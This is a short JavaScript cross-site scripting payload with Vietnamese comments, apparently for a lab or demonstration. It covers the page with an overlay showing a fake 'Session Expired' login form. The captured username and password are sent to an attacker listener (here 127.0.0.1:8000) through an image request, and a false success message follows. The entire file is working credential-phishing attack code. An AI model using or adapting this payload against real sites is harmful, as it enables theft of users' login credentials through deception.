// 1. Tạo một lớp phủ màn hình màu đen mờ (Overlay)
var overlay = document.createElement("div");
overlay.style.cssText =
  "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; display:flex; justify-content:center; align-items:center;";

// 2. Vẽ một Form Đăng nhập giả mạo
var form = document.createElement("div");
form.style.cssText =
  "background:#fff; padding:30px; border-radius:8px; width:300px; text-align:center; font-family:sans-serif; box-shadow: 0 4px 15px rgba(0,0,0,0.5);";
form.innerHTML = `
    <h3 style="margin-top:0; color:#d9534f;">⚠️ Session Expired</h3>
    <p style="font-size:14px; color:#555; margin-bottom:20px;">Vui lòng xác thực lại để tiếp tục đọc bài viết.</p>
    <input type="text" id="xss-user" placeholder="Username" style="width:100%; margin-bottom:15px; padding:10px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px;">
    <input type="password" id="xss-pass" placeholder="Password" style="width:100%; margin-bottom:20px; padding:10px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px;">
    <button id="xss-btn" style="width:100%; padding:10px; background:#0056b3; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">Log In</button>
`;

overlay.appendChild(form);
document.body.appendChild(overlay);

// 3. Lắng nghe sự kiện click vào nút Đăng nhập
document.getElementById("xss-btn").onclick = function () {
  var u = document.getElementById("xss-user").value;
  var p = document.getElementById("xss-pass").value;

  // Gửi dữ liệu về máy chủ Attacker (Cổng 8000)
  new Image().src =
    "http://127.0.0.1:8000/log?username=" +
    encodeURIComponent(u) +
    "&password=" +
    encodeURIComponent(p);

  // Đóng form và giả vờ thành công
  document.body.removeChild(overlay);
  alert("✅ Xác thực thành công! Bạn có thể tiếp tục.");
};
